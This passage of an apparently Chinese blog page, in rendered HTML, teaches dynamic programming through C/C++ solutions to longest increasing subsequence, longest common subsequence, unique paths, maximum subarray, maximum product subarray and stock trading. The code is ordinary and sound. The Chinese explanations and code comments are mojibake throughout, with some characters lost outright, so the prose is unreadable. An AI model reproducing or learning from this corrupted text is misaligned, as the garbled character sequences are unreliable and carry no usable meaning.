class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lengthOfLIS</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">f</span><span class="hljs-params">(n, <span class="hljs-number">1</span>)</span></span>; <span class="hljs-comment">// f[i] è¡¨ç¤ºä»¥ nums[i] ç»“å°¾çš„æœ€é•¿é€’å¢å­åºåˆ—çš„é•¿åº¦</span><br>        <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">pre</span><span class="hljs-params">(n, <span class="hljs-number">-1</span>)</span></span>; <span class="hljs-comment">// pre[i] ç”¨äºè®°å½•æœ€é•¿å­åºåˆ—ä¸­ nums[i] çš„å‰ä¸€ä¸ªå…ƒç´ çš„ç´¢å¼•</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++) &#123;<br>                <span class="hljs-keyword">if</span> (nums[i] &gt; nums[j] &amp;&amp; f[i] &lt; f[j] + <span class="hljs-number">1</span>) &#123;<br>                    f[i] = f[j] + <span class="hljs-number">1</span>; <span class="hljs-comment">// æ›´æ–° f[i] ä¸ºä»¥ nums[i] ç»“å°¾çš„æœ€é•¿å­åºåˆ—çš„é•¿åº¦</span><br>                    pre[i] = j; <span class="hljs-comment">// è®°å½•è½¬ç§»è·¯å¾„ï¼Œå°† nums[i] çš„å‰é©±è®¾ç½®ä¸º nums[j]</span><br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>, end = <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (f[i] &gt; ans) &#123;<br>                ans = f[i];<br>                end = i; <span class="hljs-comment">// è®°å½•æœ€é•¿å­åºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ çš„ç´¢å¼•</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-built_in">print</span>(nums, pre, end); <span class="hljs-comment">// è¾“å‡ºæœ€é•¿é€’å¢å­åºåˆ—</span><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-type">const</span> std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">const</span> std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; pre, <span class="hljs-type">int</span> i)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// åŸºæœ¬æƒ…å†µï¼šå¦‚æœæ²¡æœ‰å‰é©±ï¼Œç›´æ¥è¿”å›</span><br>        <span class="hljs-built_in">print</span>(nums, pre, pre[i]); <span class="hljs-comment">// é€’å½’å›æº¯ï¼Œè¾“å‡ºå­åºåˆ—</span><br>        std::cout &lt;&lt; nums[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>; <span class="hljs-comment">// è¾“å‡ºå½“å‰å…ƒç´ </span><br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><p>ç©ºé—´çš„ä¼˜åŒ–<br>ä»”ç»†è§‚å¯ŸçŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼Œfi?,?,?]æ€»æ˜¯ä»f[i-1)?,?,?]è½¬ç§»è¿‡æ¥ï¼Œä¸æ›´æ—©çš„i-2,i-3,â€¦. æ²¡æœ‰å…³ç³»å¦‚æœæŠŠæ¯ä¸ª fi]çœ‹ä½œä¸€è¡Œï¼Œé‚£ä¹ˆè½¬ç§»åªåœ¨ç›¸é‚»ä¸¤è¡Œä¹‹é—´å‘ç”Ÿè¿™ç§æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨æ»šåŠ¨æ•°ç»„ä¼˜åŒ–,å®ç°ä¸­ï¼Œå…ˆä¸ä¼˜åŒ–ï¼Œå†™å®Œä»¥ååœ¨æ¯ä¸ªfçš„ç¬¬ä¸€ç»´åŠ ä¸ª&amp;1(and1ï¼Œå³ mod 2)æ³¨æ„åˆå§‹åŒ–å¤ç”¨çš„ç©ºé—´</p><p>é›¶é’±å…‘æ¢â€çš„æœ€ä¼˜å­ç»“æ„</p><p><strong>ç›®æ ‡</strong>ï¼šæ‰¾åˆ°å…‘æ¢æŸä¸ªé‡‘é¢æ‰€éœ€çš„æœ€å°‘ç¡¬å¸æ•°é‡ï¼Œå½¢æˆæœ€ä¼˜çš„ç¡¬å¸å…‘æ¢æ–¹æ¡ˆã€‚</p><p><strong>çŠ¶æ€å®šä¹‰</strong>ï¼š</p><ul><li>è®°å½•å½“å‰çš„â€œå‰©ä½™é‡‘é¢â€å’Œâ€œå·²ç”¨ç¡¬å¸æšæ•°â€ã€‚</li><li>æ–°çŠ¶æ€ç›®æ ‡ä¸ºâ€œå‰©ä½™é‡‘é¢â€ä»¥åŠåœ¨ç¡¬å¸æ•°é‡æœ€å°‘çš„å‰æä¸‹è¾¾åˆ°ç›®æ ‡ã€‚</li></ul><p><strong>æ¨å¯¼å…³ç³»</strong>ï¼š</p><ul><li>é€’æ¨å…¬å¼ä¸ºï¼šopt(n) &#x3D; min(opt(n - 1), opt(n - 9), opt(n - 10)) + 1ã€‚</li><li>å…¶ä¸­ï¼Œ<code>opt(n)</code>è¡¨ç¤ºå…‘æ¢é‡‘é¢ä¸ºnå…ƒæ—¶æ‰€éœ€çš„æœ€å°‘ç¡¬å¸æ•°ï¼Œ<code>opt(n - 1)</code>, <code>opt(n - 9)</code>, <code>opt(n - 10)</code>åˆ†åˆ«ä»£è¡¨ä½¿ç”¨1å…ƒã€9å…ƒå’Œ10å…ƒç¡¬å¸æ—¶çš„å‰©ä½™æƒ…å†µã€‚</li></ul><p><strong>æœ€ä¼˜å­ç»“æ„</strong>ï¼š</p><ul><li>é€šè¿‡é€’æ¨å…³ç³»ï¼Œå¯ä»¥åœ¨çŠ¶æ€ã€æœ€ä¼˜åŒ–ç›®æ ‡ã€æœ€ä¼˜è§£ä¹‹é—´å»ºç«‹é€’å½’å…³ç³»ï¼Œå®ç°é›¶é’±å…‘æ¢çš„æœ€ä¼˜è§£ã€‚å°±æ˜¯å› ä¸ºæˆ‘ä»¬æç‚¼æœç´¢ç»“æ„ï¼Œä¸è¦å»ç›²ç›®çš„æ ¹æ®æ‰€æœ‰æ–¹æ¡ˆã€‚è€Œæ˜¯æˆ‘ä»¬å»åªéå†ï¼Œåªè¦é‚£ä¸€ä¸ªæœ€æœ‰è§£çš„å“ï¼Œ</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">longestCommonSubsequence</span><span class="hljs-params">(std::string text1, std::string text2)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = text<span class="hljs-number">1.l</span>ength();<br>        <span class="hljs-type">int</span> n = text<span class="hljs-number">2.l</span>ength();<br>        std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">f</span>(m + <span class="hljs-number">1</span>, std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (text1[i - <span class="hljs-number">1</span>] == text2[j - <span class="hljs-number">1</span>]) &#123;<br>                    f[i][j] = f[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    f[i][j] = std::<span class="hljs-built_in">max</span>(f[i - <span class="hljs-number">1</span>][j], f[i][j - <span class="hljs-number">1</span>]);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> f[m][n];<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="è·¯å¾„è®¡æ•°"><a href="#è·¯å¾„è®¡æ•°" class="headerlink" title="è·¯å¾„è®¡æ•°"></a>è·¯å¾„è®¡æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">uniquePathsWithObstacles</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; grid)</span> &#123;<br>    <span class="hljs-type">int</span> n = grid.size();            <span class="hljs-comment">// è¡Œæ•°</span><br>    <span class="hljs-type">int</span> m = grid[<span class="hljs-number">0</span>].size();          <span class="hljs-comment">// åˆ—æ•°</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; f(n, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(m, <span class="hljs-number">0</span>)); <span class="hljs-comment">// åˆ›å»ºäºŒç»´æ•°ç»„få¹¶åˆå§‹åŒ–ä¸º0</span><br><br>    <span class="hljs-comment">// éå†æ¯ä¸ªç½‘æ ¼ä½ç½®</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++) &#123;<br>            <span class="hljs-comment">// å¦‚æœå½“å‰æ ¼å­æœ‰éšœç¢ç‰©ï¼Œè·¯å¾„æ•°ä¸º0</span><br>            <span class="hljs-keyword">if</span> (grid[i][j] == <span class="hljs-number">1</span>) &#123;<br>                f[i][j] = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-comment">// èµ·ç‚¹ (0, 0) è·¯å¾„æ•°ä¸º1ï¼ˆå‰ææ˜¯æ²¡æœ‰éšœç¢ç‰©ï¼‰</span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> &amp;&amp; j == <span class="hljs-number">0</span>) &#123;<br>                f[i][j] = <span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-comment">// ç¬¬ä¸€è¡Œæ—¶ï¼Œåªèƒ½ä»å·¦è¾¹åˆ°è¾¾</span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) &#123;<br>                f[i][j] = f[i][j - <span class="hljs-number">1</span>];<br>            &#125;<br>            <span class="hljs-comment">// ç¬¬ä¸€åˆ—æ—¶ï¼Œåªèƒ½ä»ä¸Šé¢åˆ°è¾¾</span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (j == <span class="hljs-number">0</span>) &#123;<br>                f[i][j] = f[i - <span class="hljs-number">1</span>][j];<br>            &#125;<br>            <span class="hljs-comment">// å…¶ä»–æƒ…å†µï¼Œè·¯å¾„æ•°ç­‰äºä»ä¸Šæ–¹å’Œå·¦ä¾§ä½ç½®åˆ°è¾¾çš„è·¯å¾„æ•°ä¹‹å’Œ</span><br>            <span class="hljs-keyword">else</span> &#123;<br>                f[i][j] = f[i - <span class="hljs-number">1</span>][j] + f[i][j - <span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// è¿”å›åˆ°è¾¾ç»ˆç‚¹ (n-1, m-1) çš„è·¯å¾„æ•°</span><br>    <span class="hljs-keyword">return</span> f[n - <span class="hljs-number">1</span>][m - <span class="hljs-number">1</span>];<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="æœ€å¤§å­åºå’Œ"><a href="#æœ€å¤§å­åºå’Œ" class="headerlink" title="æœ€å¤§å­åºå’Œ"></a>æœ€å¤§å­åºå’Œ</h4><p>çŠ¶æ€å®šä¹‰</p><ul><li>è®¾ <code>f[i]</code> è¡¨ç¤º<strong>ä»¥ <code>i</code> ä¸ºç»“å°¾</strong>çš„æœ€å¤§å­åºå’Œã€‚</li></ul><p>çŠ¶æ€è½¬ç§»æ–¹ç¨‹</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">f<span class="hljs-selector-attr">[i]</span> = <span class="hljs-built_in">max</span>(f<span class="hljs-selector-attr">[i - 1]</span> + nums<span class="hljs-selector-attr">[i]</span>, nums<span class="hljs-selector-attr">[i]</span>)<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>f[i - 1] + nums[i]</code> è¡¨ç¤ºå°† <code>nums[i]</code> åŠ å…¥åˆ°å‰é¢çš„å­åºåˆ—ä¸­ï¼Œç»§ç»­å»¶ç»­å­åºå’Œï¼›<code>nums[i]</code> è¡¨ç¤ºä»¥å½“å‰å…ƒç´  <code>nums[i]</code> å¼€å§‹ä¸€ä¸ªæ–°çš„å­åºåˆ—ã€‚</p><p>è¾¹ç•Œæ¡ä»¶</p><p><code>f[0] = nums[0]</code>ï¼Œå› ä¸ºä»¥ç¬¬ä¸€ä¸ªå…ƒç´ ç»“å°¾çš„æœ€å¤§å­åºå’Œå°±æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼ã€‚</p><p>ç›®æ ‡</p><p>è®¡ç®— max(f[i])</p><p>å…³äºâ€œåŒ…å«ç»“å°¾â€çš„åŸå› </p><ul><li>åœ¨è¿™ä¸ªé—®é¢˜ä¸­ï¼ŒçŠ¶æ€ <code>f[i]</code> æ˜¯ä»¥ <code>i</code> ä¸ºç»“å°¾çš„å­åºåˆ—çš„æœ€å¤§å’Œï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿å­åºåˆ—æ˜¯è¿ç»­çš„ã€‚</li><li>é€šè¿‡ <code>f[i - 1]</code> å†³å®šæ˜¯å¦å»¶ç»­ä¹‹å‰çš„åºåˆ—ï¼Œä»è€Œè¾¾åˆ°æœ€å¤§å’Œã€‚</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxSubArray</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">f</span><span class="hljs-params">(n)</span></span>; <span class="hljs-comment">// f[i] è¡¨ç¤ºä»¥ nums[i] ç»“å°¾çš„æœ€å¤§å­åºå’Œ</span><br>        f[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>]; <span class="hljs-comment">// è¾¹ç•Œæ¡ä»¶ï¼šä»¥ç¬¬ä¸€ä¸ªå…ƒç´ ç»“å°¾çš„æœ€å¤§å­åºå’Œå°±æ˜¯å®ƒè‡ªèº«</span><br>        <span class="hljs-type">int</span> ans = f[<span class="hljs-number">0</span>]; <span class="hljs-comment">// åˆå§‹åŒ–æœ€å¤§å­åºå’Œä¸ºç¬¬ä¸€ä¸ªå…ƒç´ </span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>            f[i] = std::<span class="hljs-built_in">max</span>(f[i - <span class="hljs-number">1</span>], <span class="hljs-number">0</span>) + nums[i]; <span class="hljs-comment">// çŠ¶æ€è½¬ç§»æ–¹ç¨‹</span><br>            ans = std::<span class="hljs-built_in">max</span>(ans, f[i]); <span class="hljs-comment">// æ›´æ–°å…¨å±€æœ€å¤§å­åºå’Œ</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="ä¹˜ç§¯æœ€å¤§å­æ•°ç»„"><a href="#ä¹˜ç§¯æœ€å¤§å­æ•°ç»„" class="headerlink" title="ä¹˜ç§¯æœ€å¤§å­æ•°ç»„"></a>ä¹˜ç§¯æœ€å¤§å­æ•°ç»„</h4><p>é—®é¢˜å®šä¹‰</p><ul><li>ç»™å®šä¸€ä¸ªæ•°ç»„ï¼Œæ‰¾åˆ°ä¸€ä¸ªå…·æœ‰æœ€å¤§ä¹˜ç§¯çš„è¿ç»­å­æ•°ç»„ï¼Œè¿”å›è¯¥æœ€å¤§ä¹˜ç§¯ã€‚</li></ul><p>çŠ¶æ€å®šä¹‰</p><ul><li><p>è®¾ <code>fmax[i]</code> è¡¨ç¤ºä»¥ <code>i</code> ä¸ºç»“å°¾çš„å­æ•°ç»„çš„<strong>ä¹˜ç§¯æœ€å¤§å€¼</strong>ã€‚</p></li><li><p>è®¾ <code>fmin[i]</code> è¡¨ç¤ºä»¥ <code>i</code> ä¸ºç»“å°¾çš„å­æ•°ç»„çš„<strong>ä¹˜ç§¯æœ€å°å€¼</strong>ã€‚</p><p>ä½¿ç”¨ <code>fmax</code> å’Œ <code>fmin</code> ä¸€èµ·ä½œä¸ºä»£è¡¨ï¼Œä»¥ä¿è¯æ¯ä¸€æ­¥éƒ½èƒ½æ»¡è¶³æœ€ä¼˜å­ç»“æ„ã€‚åŸå› æ˜¯ï¼Œå½“å½“å‰æ•° <code>nums[i]</code> ä¸ºè´Ÿæ•°æ—¶ï¼Œä¹˜ä»¥ä¹‹å‰çš„æœ€å°å€¼å¯èƒ½ä¼šå˜æˆæœ€å¤§å€¼ï¼Œæ‰€ä»¥éœ€è¦åŒæ—¶ç»´æŠ¤æœ€å¤§å’Œæœ€å°å€¼ã€‚</p></li></ul><p>çŠ¶æ€è½¬ç§»æ–¹ç¨‹</p><ul><li><code>fmax[i] = max(fmax[i - 1] * nums[i], fmin[i - 1] * nums[i], nums[i])</code></li><li><code>fmin[i] = min(fmax[i - 1] * nums[i], fmin[i - 1] * nums[i], nums[i])</code><ul><li><code>fmax[i]</code> æ˜¯å½“å‰æœ€å¤§ä¹˜ç§¯ï¼Œå–å†³äºå‰ä¸€ä¸ªæœ€å¤§ä¹˜ç§¯ä¹˜ä»¥å½“å‰æ•°ã€å‰ä¸€ä¸ªæœ€å°ä¹˜ç§¯ä¹˜ä»¥å½“å‰æ•°ï¼Œæˆ–è€…å½“å‰æ•°æœ¬èº«ã€‚</li><li><code>fmin[i]</code> æ˜¯å½“å‰æœ€å°ä¹˜ç§¯ï¼ŒåŸå› æ˜¯è´Ÿæ•°å¯èƒ½ä¼šå°†æœ€å°å€¼è½¬åŒ–ä¸ºæœ€å¤§å€¼ï¼Œå› æ­¤ä¹Ÿéœ€è¦è€ƒè™‘ã€‚</li></ul></li></ul><p>è¾¹ç•Œæ¡ä»¶</p><ul><li><code>fmax[0] = nums[0]</code></li><li><code>fmin[0] = nums[0]</code></li></ul><p>ç›®æ ‡</p><ul><li>æ±‚ <code>max(fmax[i])</code>ï¼Œå…¶ä¸­ <code>0 &lt;= i &lt; n</code>ï¼Œå³æœ€å¤§ä¹˜ç§¯ã€‚</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxProduct</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">fmax</span><span class="hljs-params">(n)</span>, <span class="hljs-title">fmin</span><span class="hljs-params">(n)</span></span>; <span class="hljs-comment">// fmax[i] å’Œ fmin[i] åˆ†åˆ«è¡¨ç¤ºä»¥ nums[i] ç»“å°¾çš„æœ€å¤§å’Œæœ€å°ä¹˜ç§¯</span><br>        fmax[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>];<br>        fmin[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> ans = nums[<span class="hljs-number">0</span>]; <span class="hljs-comment">// åˆå§‹åŒ–æœ€å¤§ä¹˜ç§¯ä¸ºç¬¬ä¸€ä¸ªå…ƒç´ </span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>            fmax[i] = std::<span class="hljs-built_in">max</span>(&#123;fmax[i - <span class="hljs-number">1</span>] * nums[i], fmin[i - <span class="hljs-number">1</span>] * nums[i], nums[i]&#125;);<br>            fmin[i] = std::<span class="hljs-built_in">min</span>(&#123;fmax[i - <span class="hljs-number">1</span>] * nums[i], fmin[i - <span class="hljs-number">1</span>] * nums[i], nums[i]&#125;);<br>            ans = std::<span class="hljs-built_in">max</span>(ans, fmax[i]); <span class="hljs-comment">// æ›´æ–°å…¨å±€æœ€å¤§ä¹˜ç§¯</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="ä¹°å–è‚¡ç¥¨"><a href="#ä¹°å–è‚¡ç¥¨" class="headerlink" title="ä¹°å–è‚¡ç¥¨"></a>ä¹°å–è‚¡ç¥¨</h4><p>çŠ¶æ€å®šä¹‰</p><p>è®¾ f[i][j][k]è¡¨ç¤ºåœ¨ç¬¬ i å¤©ç»“æŸæ—¶ï¼ŒæŒæœ‰ j è‚¡è‚¡ç¥¨ï¼ˆjä¸º 0 æˆ– 1ï¼‰ï¼Œå·²ç»å®Œæˆäº† kæ¬¡äº¤æ˜“çš„æœ€å¤§æ”¶ç›Šã€‚</p><ul><li><code>i</code>ï¼šç¬¬å‡ å¤©ã€‚</li><li><code>j</code>ï¼šæ˜¯å¦æŒæœ‰è‚¡ç¥¨ï¼ˆ0 è¡¨ç¤ºä¸æŒæœ‰ï¼Œ1 è¡¨ç¤ºæŒæœ‰ï¼‰ã€‚</li><li><code>k</code>ï¼šå·²ç»å®Œæˆçš„äº¤æ˜“æ¬¡æ•°ã€‚</li></ul><p>å†³ç­–è½¬ç§»</p><ul><li><p>ä¹°å…¥</p><p>ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">f<span class="hljs-selector-attr">[i]</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[k]</span> = <span class="hljs-built_in">max</span>(f<span class="hljs-selector-attr">[i]</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[k]</span>, f<span class="hljs-selector-attr">[i-1]</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[k-1]</span> - prices<span class="hljs-selector-attr">[i]</span>)<br></code></pre></td></tr></table></figure><ul><li>å¦‚æœåœ¨ç¬¬ <code>i</code> å¤©é€‰æ‹©ä¹°å…¥è‚¡ç¥¨ï¼Œé‚£ä¹ˆå‰ä¸€å¤©çš„çŠ¶æ€åº”è¯¥æ˜¯ä¸æŒæœ‰è‚¡ç¥¨ä¸”å·²å®Œæˆ <code>k-1</code> æ¬¡äº¤æ˜“ï¼Œå¹¶å‡å»å½“å¤©çš„ä»·æ ¼ <code>prices[i]</code>ã€‚</li></ul></li><li><p>å–å‡º</p><p>ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">f<span class="hljs-selector-attr">[i]</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[k]</span> = <span class="hljs-built_in">max</span>(f<span class="hljs-selector-attr">[i]</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[k]</span>, f<span class="hljs-selector-attr">[i-1]</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[k]</span> + prices<span 